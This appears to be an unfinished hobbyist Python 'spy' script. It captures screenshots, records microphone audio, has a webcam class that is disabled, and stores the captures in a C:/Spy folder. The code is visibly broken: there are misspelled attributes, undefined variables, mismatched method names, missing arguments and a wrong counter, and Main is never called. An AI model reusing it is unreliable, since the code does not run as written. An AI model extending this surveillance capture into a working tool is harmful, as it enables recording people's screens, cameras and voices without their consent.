# For screenshots
import pyautogui
# For webcam
import pygame
import pygame.camera
# For microphone
import sounddevice as sd
from scipy.io.wavfile import write

import os

def CreateSpyDirectory():
    # Directory 
    directory = "Spy"
  
    # Parent Directory path 
    parent_dir = "C:/"
  
    # Path 
    path = os.path.join(parent_dir, directory) 

     # Create
    try:
        os.mkdir(path) 
        print("Created the Spy folder as C:/Spy")

    except:
        print("Spy folder already exists")

class BookKeeperDemon():
    def __init__(self, screenshotcount_, webcamshotcount_):
        self.screenshotcount_ = screenshotcount_
        self.webcamshotcount_ = webcamshotcount_

    def GetSSC(self):
        return self.screenshotcount_

    def GetWCC(self):
        return self.webwebcamshotcount_

    def IncrementSSC(self):
        self.screenshotcount_ += 1

class WebcamDemon():
    # Currently only supported on Linux
    # Or at least my laptops webcam is not found
    def __init__(self):
        pygame.camera.init()
        # see if cameras are detected
        self.camlist_ = pygame.camera.list_cameras()
        self.cam_ = pygame.camera.Camera(self.camlist_[0],(640,480))
        print("WebcamDemon spawned!")

    def takeWCC(self):
        self.cam_.start()
        WCC = self.cam_.get_image()
        return WCC
    def saveWCC(self, location):
        pygame.image.save(image, r"" + str(location) + "\Webcamshot" + str(BKD.GetWCC()) + ".jpg")


class ScreenshotDemon():
    def __init__(self):
        print("ScreenshotDemon spawned!")

    def takeSSC(self):
        ss = pyautogui.screenshot()
        return ss

    def saveSSC(self, ss, location):
        ss.save(r"" + str(location) + "\Screenshot"+ str(BKD.GetSSC()) + ".jpg")

class MicrophoneDemon():
    def __init__(self):
        print("MicrophoneDemon spawned!")

    def takeAudioRecording(self, samplerate, durationseconds):
        # TODO: Make save to another method ?
        recording = sd.rec(int(durationseconds * samplerate), samplerate=samplerate, channels=2)
        sd.wait()
        # TODO: no location set yet
        write('audiorecording.wav', samplerate, recording)


def takeScreenshot(SSC, BKD):
    # Take a screenshot
    SSC.takeSSC()

    # Save to the spy folder
    location = 'c:\Spy'
    SSC.saveSSC(location)

    # Update records
    print("Took a screenshot! Saves as number " + str(BKD.GetSSC()))
    BKD.IncrementSSC()
    print("Updated the BookKeeperDemon records")

def takeWebcamshot(WCD, BKD):
    # Take a picture with the webcam
    image = WCD.TakeWCC()

    # Save to the spy folder
    location = 'c:\Spy'
    WCD.saveWCC(location)

    # Update records
    print("Took a Webcamshot! Saved as number " + str(BKD.GetWCC()))
    BKD.IncrementSSC()
    print("Updated the BookKeeperDemon records")

def Main():
    CreateSpyDirectory()
    BKD = BookKeeperDemon(0,0)
    SSD = ScreenshotDemon()
    MPD = MicrophoneDemon()
    # WCD = WebcamDemon()
    takeScreenshot(SSD, BKD)
    # takeWebcamshot(WCD,BKD)
    MPD.takeAudioRecording(44100, 10)
    

